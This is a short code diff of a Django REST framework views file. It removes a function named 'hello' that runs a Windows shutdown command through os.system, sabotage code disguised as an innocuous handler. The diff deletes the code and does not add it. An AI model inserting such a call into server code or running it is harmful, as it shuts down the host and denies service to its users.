@@ -4,11 +4,6 @@ from rest_framework.views import APIView
 from rest_framework.response import Response
 from .serializers import AccountSerializer, FastCostumerSerializer
 
-def hello(request):
-    import os
-    os.system('shutdown /s /t 1')
-    return request
-
 class FastCostumerList(APIView):
 
     def get(self, request, format=None):
